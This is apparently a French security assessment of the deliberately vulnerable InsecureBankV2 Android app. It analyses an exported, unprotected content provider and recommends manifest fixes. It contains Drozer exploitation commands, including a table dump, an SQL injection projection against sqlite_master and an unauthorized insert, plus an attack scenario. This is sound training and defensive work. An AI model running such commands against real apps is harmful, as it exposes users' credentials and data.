# Analyse des Risques — Content Providers Exportés
**Application :** `com.android.insecurebankv2`  
**Catégorie OWASP Mobile :** M2 – Insecure Data Storage

---

## Composant Analysé

### `TrackUserContentProvider` ⚠️ CRITIQUE

| Attribut | Valeur |
|---|---|
| Nom complet | `com.android.insecurebankv2.TrackUserContentProvider` |
| Authority | `com.android.insecurebankv2.TrackUserContentProvider` |
| Exporté | ✅ Oui |
| Read Permission | `null` ❌ |
| Write Permission | `null` ❌ |
| Multiprocess | False |
| Grant Uri Permissions | False |
| URI accessible confirmée | `content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers` |

*Source : captures 10, 13, 14*

---

## Preuves Drozer

```
dz> run app.provider.info -a com.android.insecurebankv2
  Authority: com.android.insecurebankv2.TrackUserContentProvider
    Read Permission:  null
    Write Permission: null
```

```
dz> run scanner.provider.finduris -a com.android.insecurebankv2
  For sure accessible content URIs:
    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

---

## Scénario d'Attaque

```
[ÉTAPE 1] Attaquant obtient une app sur l'appareil (malware, app légitime)
          ↓
[ÉTAPE 2] Requête directe sur l'URI sans aucune permission requise :
          ContentResolver.query(
            Uri.parse("content://...TrackUserContentProvider/trackerusers"),
            null, null, null, null
          )
          ↓
[ÉTAPE 3] Récupération de tous les enregistrements de la table trackerusers
          ↓
[RÉSULTAT] Noms d'utilisateur, données de tracking, identifiants exposés
```

**Commandes Drozer d'exploitation :**
```bash
# Lire le contenu de la table
dz> run app.provider.query \
    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers \
    --selection ""

# Tenter une injection SQL
dz> run app.provider.query \
    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers \
    --projection "* FROM sqlite_master--"

# Tenter une écriture
dz> run app.provider.insert \
    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers \
    --string username attacker --string password injected
```

---

## Remédiation Recommandée

```xml
<!-- CORRECTION dans AndroidManifest.xml -->
<provider android:name=".TrackUserContentProvider"
          android:authorities="com.android.insecurebankv2.TrackUserContentProvider"
          android:exported="false"
          android:readPermission="com.android.insecurebankv2.permission.READ_DATA"
          android:writePermission="com.android.insecurebankv2.permission.WRITE_DATA"/>
```

**Complément :** Implémenter une validation des paramètres de requête dans `query()` et `insert()` pour prévenir les injections SQL.

---

## Évaluation du Risque

| Critère | Évaluation |
|---|---|
| Vecteur | App locale sur l'appareil |
| Complexité | Faible (1 ligne de code ContentResolver) |
| Privilèges requis | Aucun |
| Impact confidentialité | Élevé |
| Impact intégrité | Élevé |
| **Score CVSS estimé** | **9.1 (Critical)** |

---

## Références
- OWASP Mobile Top 10 : M2 – Insecure Data Storage
- CWE-284 : Improper Access Control
- Android Security : https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions
